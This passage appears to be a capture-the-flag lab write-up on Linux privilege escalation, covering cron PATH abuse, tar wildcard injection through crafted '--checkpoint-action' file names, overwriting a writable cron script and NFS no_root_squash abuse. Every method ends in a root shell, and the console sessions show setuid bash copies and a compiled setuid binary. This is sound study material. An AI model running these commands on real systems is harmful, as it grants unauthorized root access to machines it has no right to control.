We can see that a cronjob runs with root privilege every minutes on a file in our user directory :

```console
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~$ ls
myvpn.ovpn  overwrite.sh  shell.nse  tools  x.c
TCM@debian:~$ chmod +x overwrite.sh 
# wait 1 minute
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```
{: .nolineno }

No Answer

## TASK 17 : Privilege Escalation - Cron (Wildcards)
### Click 'Completed' once you have successfully elevated the machine

We can abuse cronjob where a wildcard is used with command tar in the file like "compress.sh" :

```console
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
{: .nolineno }

Exploitation :

```console
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
TCM@debian:~$ ls 
myvpn.ovpn  overwrite.sh  runme.sh  shell.nse  tools  x.c
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\runme.sh
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 
```
{: .nolineno }

No Answer

## TASK 18 : Privilege Escalation - Cron (File Overwrite)
### Click 'Completed' once you have successfully elevated the machine 
The "overwrite.sh" file from the crontab is writable by our current user so we can abuse it :

```console
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~$ ls -l overwrite.sh 
-rwxr-xr-x 1 TCM user 43 Apr 18 09:29 overwrite.sh
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
TCM@debian:~$ ls /tmp
backup.tar.gz  bash  nginxrootsh  service  service.c  useless  x.so
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 
```
{: .nolineno }

No Answer

## TASK 19 : Privilege Escalation - NFS Root Squashing 
### Click 'Completed' once you have successfully elevated the machine 

From the output, notice that “no_root_squash” option is defined for the “/tmp” export. 

```console
CM@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```
{: .nolineno }

From our Kali :

```console
root@ip-10-10-9-130:~/Desktop# showmount -e 10.10.3.74
Export list for 10.10.3.74:
/tmp *
root@ip-10-10-9-130:~/Desktop# mkdir /tmp/1
root@ip-10-10-9-130:~/Desktop# mount -o rw,vers=2 10.10.3.74:/tmp /tmp1
mount.nfs: mount point /tmp1 does not exist
root@ip-10-10-9-130:~/Desktop# mount -o rw,vers=2 10.10.3.74:/tmp /tmp/1
root@ip-10-10-9-130:~/Desktop# echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
root@ip-10-10-9-130:~/Desktop# gcc /tmp/1/x.c -o /tmp/1/x
/tmp/1/x.c: In function \u2018main\u2019:
/tmp/1/x.c:1:14: warning: implicit declaration of function \u2018setgid\u2019 [-Wimplicit-function-declaration]
 int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
              ^~~~~~
/tmp/1/x.c:1:25: warning: implicit declaration of function \u2018setuid\u2019 [-Wimplicit-function-declaration]
 int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
                         ^~~~~~
/tmp/1/x.c:1:36: warning: implicit declaration of function \u2018system\u2019 [-Wimplicit-function-declaration]
 int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
                                    ^~~~~~
root@ip-10-10-9-130:~/Desktop# chmod +s /tmp/1/x
```
{: .nolineno }

From the victim machine ;

```console
TCM@debian:~$ /tmp/x
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# 
```
{: .nolineno }

No Answer